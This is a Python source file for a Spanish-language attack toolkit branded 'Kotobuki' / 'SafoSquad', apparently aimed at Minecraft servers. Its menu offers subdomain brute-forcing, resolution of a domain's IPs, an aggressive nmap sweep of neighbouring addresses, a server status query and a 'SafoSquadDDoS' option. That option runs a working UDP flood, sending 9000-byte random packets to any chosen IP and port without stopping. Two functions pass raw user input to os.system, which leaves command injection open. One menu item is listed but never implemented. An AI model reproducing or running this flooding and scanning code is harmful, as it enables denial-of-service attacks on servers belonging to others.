import socket
import subprocess
import os
import sys
from threading import Thread
import time
from mcstatus import MinecraftServer
from colorama import *
import random
import colorama 
from colorama import Fore, Back, Style 
colorama.init(autoreset=True)
import colorama 




def clear(): 
    if (os.name == "nt"): 
        os.system('cls') 
    else: 
        os.system('clear') 

def separator():
    print(Fore.WHITE + "---------------------------------------------------------------------------------------")

def mainMenu():
    clear()

    separator()
    print(f"""{Fore.RED}

    
▄ •▄       ▄▄▄▄▄      ▄▄▄▄· ▄• ▄▌▄ •▄ ▪      
█▌▄▌▪▪     •██  ▪     ▐█ ▀█▪█▪██▌█▌▄▌▪██     
▐▀▀▄· ▄█▀▄  ▐█.▪ ▄█▀▄ ▐█▀▀█▄█▌▐█▌▐▀▀▄·▐█·    
▐█.█▌▐█▌.▐▌ ▐█▌·▐█▌.▐▌██▄▪▐█▐█▄█▌▐█.█▌▐█▌    
·▀  ▀ ▀█▄▀▪ ▀▀▀  ▀█▄▀▪·▀▀▀▀  ▀▀▀ ·▀  ▀▀▀▀    
 \033[1;33m#SafoSquad | Ghostrick\033[1;m                                                     
                                                              
                                                              """)

    print(Fore.YELLOW)
    print(Fore.LIGHTMAGENTA_EX + "[X] [Nuevos complementos] " + Fore.BLUE)
    print(Fore.LIGHTMAGENTA_EX + "[1] Subdomain Scanner")
    print(Fore.LIGHTMAGENTA_EX + "[2] Dedicated Scanner")
    print(Fore.LIGHTMAGENTA_EX + "[3] Nmap Tracker")
    print(Fore.LIGHTMAGENTA_EX + "[4] IP Info")
    print(Fore.LIGHTMAGENTA_EX + "[5] ServerStatus")
    print(Fore.LIGHTMAGENTA_EX + "[6] SafoSquadDDoS")
    print(Fore.LIGHTMAGENTA_EX + "[7] SQLI Checker")
    print(Fore.LIGHTMAGENTA_EX + "[8] Para salir presione la opcion 8")
    
    print(Fore.WHITE)

    separator()
    print()

    
    try:
        selection = input(Fore.BLUE + "root@Kotobuki: " + Fore.YELLOW)
    except KeyboardInterrupt:
        print(Fore.WHITE)
        sys.exit()

    try:
        selection = int(selection)
    except:
        clear()
        print(Fore.RED + "!Porfavor selecciona un numero!")
        time.sleep(2)
        mainMenu()

    print(Fore.WHITE)
    if (selection == 1):
        subdomain()
    if (selection == 2):
        deds()
    if (selection == 3):
        tracker()
    if (selection == 4):
        ipinfo()
    if (selection == 5):
        serverstatus()
    if (selection == 6):
        toxicdos()
    if (selection == 99):
        clear()
        quit()

def back():
    print()
    if (os.name == "nt"):
        os.system("pausar")
    else:
        os.system('read -s -n 1 -p "Presione cualquier tecla para continuar ..."')
    
    mainMenu()

def subdomain():
    domain = input("Dominio: ")
    
    clear()

    print("--- Subdominios de " + domain + " ---")
    print(Fore.YELLOW)

    subdomains = ["www", "build", "web", "dev", "staff", "mc", "play", "sys", "node1", "node2", "node3", "builder", "developer", "test", "test1", "forum", "bans", "baneos", "ts", "ts3", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "server", "help", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "cdn", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeals", "appeal", "store-assets"]
    for subdomain in subdomains:
        try:
            fullsub = str(subdomain)+"."+str(domain)
            ipofsub = socket.gethostbyname(str(fullsub))
            print(fullsub + " - " + ipofsub)
        except:
            pass
    
    back()

def toxicdos():
    ip = input("IP: ")
    port = int(input("Puerto de destino: "))

    clear()

    print("Empezando...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(9000)

    clear()

    print(Fore.BLUE+ "Comenzó DDoS. Presione CTRL + C para cancelar")
    while True:
        try:
            sock.sendto(bytes, (ip, port))
        except KeyboardInterrupt:
            back()

def deds():

    domain = input("Dominio: ")

    clear()

    print("--- Servidores dedicados de " + domain + " ---")
    print()

    ip_list = []
    ais = socket.getaddrinfo(domain,0,0,0,0)
    for result in ais:
        ip_list.append(result[-1][0])
        ip_list = list(set(ip_list))

    for x in range(len(ip_list)):
        print(ip_list[x])
    
    back()

def tracker():
    ip = input("IP: ")

    ip1 = ip.split(".")[0]
    ip2 = ip.split(".")[1]
    ip3 = ip.split(".")[2]
    ip4 = ip.split(".")[3]

    iprest = str(int(ip4) - 1)
    ipsum = str(int(ip4) + 1)

    result = ip1 + "." + ip2 + "." + ip3 + "." + iprest + "-" + ipsum

    clear()

    os.system ("nmap -p 1-12,1000-1010,20000-20005,25500-25600,28010-28015,30000-30005,40000-40010,65500-65535 -T5 -v -A -Pn " + result)

    back()

def ipinfo():
    ip = input("IP: ")

    clear()

    print("--- Info de " + ip + " ---")
    print()

    os.system("https://whatismyipaddress.com/ip-lookup" + ip)

    print()
    back()

def serverstatus():
    ip = input("IP: ")

    port = 25565
    if (len(ip.split(":")) != 1):
        port = int(ip.split(":")[1])
        ip = ip.split(":")[0]

    print("Conectando ")
    server = MinecraftServer(ip, port)

    print("Obteniendo el  estado")
    status = server.status()

    clear()

    print("--- estado " + ip + " ---")
    print()

    print("Motd: ", end="")
    print(status.description)
    print("Players: " + str(status.players.online) + "/" + str(status.players.max))
    print("Version: " + status.version.name)
    print("Ping: " + str(status.latency))

    back()

    print(status.description)
if (__name__ == "__main__"):
    
    
    mainMenu()
